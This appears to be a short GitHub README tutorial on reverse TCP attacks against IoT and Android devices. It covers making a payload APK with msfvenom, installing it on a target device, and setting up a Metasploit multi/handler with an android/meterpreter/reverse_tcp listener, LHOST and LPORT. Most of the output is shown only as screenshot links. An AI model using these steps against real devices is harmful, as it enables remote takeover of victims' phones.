# Reverse-TCP-Vulnerability

IoT devices are vulnerable to reverse TCP attacks.

The reverse TCP attack is a type of attack where the victim machine initiates the connection to the attacker machine. 
The attacker machine has a listener port on which it receives the connection, which it can use to execute the commands.

![Reversetcp](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/37464f86-906d-42cc-91b5-67784b5512cc)


The attacker creates a payload written using a bash shell script. This shell script carries the process payload in different forms. 
For example, in the case of Android devices, the shell script payload can be carried in the form of an Android apk.

msfvenom can be used to create payloads.

![msfvenom](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/78456489-0775-4a95-91db-e4d886252dbf)

once the payload is created, Attacker move this payload into target device. In thase case of android based devices, attaker create payload 
in the form of Android apk and install this apk in the target device.

Open the Metasploit console in the kali Linux terminal by typing "msfconsole."
After the Metasploit console opens, then type the command "use multi/handler"
Next set the payload by typing "set payload android/meterpreter/reverse_tcp"

Metasploit console in the kali linux used as a connection entry point between the attacker and the victim.

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/966f41e8-3c55-4867-9ec4-d4228b9a255f)

Set LHOST <attackipaddress> this is the IP address used as a host.

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/6a4a41b8-10c9-4395-9c07-96a8702dfa84)

Set LPORT <PORT attacker> this is the PORT used as a connection entry point between the attacker and the victim.

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/a3702304-7407-4a7f-a1fd-1d2cc66c4554)

Exploit is a command to start an exploit between the attacker and the victim's device that has been previously
connected.

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/7b0409cb-699e-4668-bfe1-80b0cd08968d)

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/f6f46734-08a0-45bb-83e6-7263c70c78ed)

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/f4dd9373-e027-4ba1-8dee-168951dd937e)

![image](https://github.com/amalrajpc/Reverse-TCP-Vulnerability/assets/102909507/59bc4f13-7c32-4867-b56b-ee5a7e69f7d4)







